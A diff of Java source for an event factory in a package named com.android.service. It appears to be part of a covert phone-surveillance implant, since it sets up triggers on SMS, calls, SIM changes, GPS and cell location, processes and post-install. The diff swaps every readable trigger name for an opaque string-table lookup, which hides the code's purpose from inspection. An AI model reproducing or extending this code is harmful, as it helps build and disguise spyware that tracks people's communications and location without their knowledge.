@@ -9,6 +9,7 @@
 
 package com.android.service.event;
 
+import com.android.service.Messages;
 import com.android.service.auto.Cfg;
 import com.android.service.interfaces.AbstractFactory;
 import com.android.service.util.Check;
@@ -18,79 +19,79 @@ public class FactoryEvent implements AbstractFactory<BaseEvent, String> {
 
 	public BaseEvent create(String type, String subtype) {
 		BaseEvent e = null;
-		if ("timer".equals(type)) {
+		if (Messages.getString("e.0").equals(type)) { //$NON-NLS-1$
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " Info: " + "");//$NON-NLS-1$ //$NON-NLS-2$
 			}
-			if ("loop".equals(subtype)) {
+			if (Messages.getString("e.1").equals(subtype)) { //$NON-NLS-1$
 				e = new EventLoop();
-			} else if ("startup".equals(subtype)) {
+			} else if (Messages.getString("e.2").equals(subtype)) { //$NON-NLS-1$
 				e = new EventStartup();
 			} else {
 				e = new EventTimer();
 			}
-		} else if ("date".equals(type)) {
+		} else if (Messages.getString("e.3").equals(type)) { //$NON-NLS-1$
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " Info: " + "");//$NON-NLS-1$ //$NON-NLS-2$
 			}
 			e = new EventDate();
-		} else if ("afterinst".equals(type)) {
+		} else if (Messages.getString("e.4").equals(type)) { //$NON-NLS-1$
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " Info: " + "");//$NON-NLS-1$ //$NON-NLS-2$
 			}
 			e = new EventAfterinst();
-		} else if ("sms".equals(type)) {
+		} else if (Messages.getString("e.5").equals(type)) { //$NON-NLS-1$
 
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " Info: " + "EVENT_SMS");//$NON-NLS-1$ //$NON-NLS-2$
 			}
 			e = new EventSms();
-		} else if ("call".equals(type)) {
+		} else if (Messages.getString("e.6").equals(type)) { //$NON-NLS-1$
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " Info: " + "EVENT_CALL");//$NON-NLS-1$ //$NON-NLS-2$
 			}
 			e = new EventCall();
-		} else if ("connection".equals(type)) {
+		} else if (Messages.getString("e.7").equals(type)) { //$NON-NLS-1$
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " Info: " + "EVENT_CONNECTION");//$NON-NLS-1$ //$NON-NLS-2$
 			}
 			e = new EventConnectivity();
-		} else if ("process".equals(type)) {
+		} else if (Messages.getString("e.8").equals(type)) { //$NON-NLS-1$
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " Info: " + "EVENT_PROCESS");//$NON-NLS-1$ //$NON-NLS-2$
 			}
 			e = new EventProcess();
-		} else if ("position cell".equals(type)) {
+		} else if (Messages.getString("e.9").equals(type)) { //$NON-NLS-1$
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " Info: " + "EVENT_CELLID");//$NON-NLS-1$ //$NON-NLS-2$
 			}
 			e = new EventCellId();
-		} else if ("quota".equals(type)) {
+		} else if (Messages.getString("e.10").equals(type)) { //$NON-NLS-1$
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " Info: " + "EVENT_QUOTA");//$NON-NLS-1$ //$NON-NLS-2$
 			}
 			e = new EventQuota();
-		} else if ("sim".equals(type)) {
+		} else if (Messages.getString("e.11").equals(type)) { //$NON-NLS-1$
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " Info: " + "EVENT_SIM_CHANGE");//$NON-NLS-1$ //$NON-NLS-2$
 			}
 			e = new EventSim();
-		} else if ("position gps".equals(type)) {
+		} else if (Messages.getString("e.12").equals(type)) { //$NON-NLS-1$
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " Info: " + "EVENT_LOCATION");//$NON-NLS-1$ //$NON-NLS-2$
 			}
 			e = new EventLocation();
-		} else if ("ac".equals(type)) {
+		} else if (Messages.getString("e.13").equals(type)) { //$NON-NLS-1$
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " Info: " + "EVENT_AC");//$NON-NLS-1$ //$NON-NLS-2$
 			}
 			e = new EventAc();
-		} else if ("battery".equals(type)) {
+		} else if (Messages.getString("e.14").equals(type)) { //$NON-NLS-1$
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " Info: " + "EVENT_BATTERY");//$NON-NLS-1$ //$NON-NLS-2$
 			}
 			e = new EventBattery();
-		} else if ("standby".equals(type)) {
+		} else if (Messages.getString("e.15").equals(type)) { //$NON-NLS-1$
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " Info: " + "EVENT_STANDBY");//$NON-NLS-1$ //$NON-NLS-2$
 			}
